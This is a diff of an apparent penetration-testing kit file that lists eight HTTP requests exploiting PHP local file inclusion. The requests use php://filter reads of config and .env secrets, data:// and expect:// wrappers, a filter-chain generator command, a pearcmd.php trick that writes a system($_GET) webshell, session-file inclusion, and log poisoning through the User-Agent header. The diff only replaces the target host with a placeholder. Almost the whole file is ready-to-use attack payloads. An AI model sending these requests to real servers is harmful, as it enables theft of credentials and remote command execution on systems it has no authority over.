@@ -2,41 +2,41 @@
 # ============================================================================
 # Safe PoC -> x8bitranjit
 # PHP LFI wrapper battery (.http format) - from read to RCE.
-# Authorized testing only. WHAT TO EDIT: target.com + the include parameter.
+# Authorized testing only. WHAT TO EDIT: target.example.invalid + the include parameter.
 # KIT CROSS-REF: LFI_CHECKLIST rows 004-013.
 # ============================================================================
 
 ### 1) php://filter source read (defeats forced .php suffix, base64 output)
-GET https://target.com/index.php?page=php://filter/convert.base64-encode/resource=config HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/index.php?page=php://filter/convert.base64-encode/resource=config HTTP/1.1
+Host: target.example.invalid
 
 ### 2) read .env / secrets through the filter
-GET https://target.com/index.php?page=php://filter/convert.base64-encode/resource=../.env HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/index.php?page=php://filter/convert.base64-encode/resource=../.env HTTP/1.1
+Host: target.example.invalid
 
 ### 3) filter-chain RCE (no file write needed) - generate the chain:
 #   https://github.com/synacktiv/php_filter_chain_generator
 #   python3 php_filter_chain_generator.py --chain '<?php echo "Safe PoC -> x8bitranjit"; system($_GET["c"]); ?>'
-GET https://target.com/index.php?page=php://filter/convert.iconv.UCS-2LE.UCS-2BE|...|convert.base64-decode/resource=data HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/index.php?page=php://filter/convert.iconv.UCS-2LE.UCS-2BE|...|convert.base64-decode/resource=data HTTP/1.1
+Host: target.example.invalid
 
 ### 4) data:// wrapper (allow_url_include on old stacks)
-GET https://target.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyAiU2FmZSBQb2MgLT4geDhiaXRyYW5qaXQiOyA/Pg== HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/index.php?page=data://text/plain;base64,PD9waHAgZWNobyAiU2FmZSBQb2MgLT4geDhiaXRyYW5qaXQiOyA/Pg== HTTP/1.1
+Host: target.example.invalid
 
 ### 5) expect:// (RCE when the extension is loaded)
-GET https://target.com/index.php?page=expect://id HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/index.php?page=expect://id HTTP/1.1
+Host: target.example.invalid
 
 ### 6) pearcmd.php RCE (default PHP docker images - no upload/log needed)
-GET https://target.com/index.php?page=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[c])?>+/tmp/x.php HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/index.php?page=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[c])?>+/tmp/x.php HTTP/1.1
+Host: target.example.invalid
 
 ### 7) session file inclusion (poison session via a reflected field first)
-GET https://target.com/index.php?page=/var/lib/php/sessions/sess_<YOURPHPSESSID>&c=id HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/index.php?page=/var/lib/php/sessions/sess_<YOURPHPSESSID>&c=id HTTP/1.1
+Host: target.example.invalid
 
 ### 8) log poisoning (payload in UA, include the log)
-GET https://target.com/index.php?page=/var/log/apache2/access.log&c=id HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/index.php?page=/var/log/apache2/access.log&c=id HTTP/1.1
+Host: target.example.invalid
 User-Agent: <?php echo "Safe PoC -> x8bitranjit"; ?>
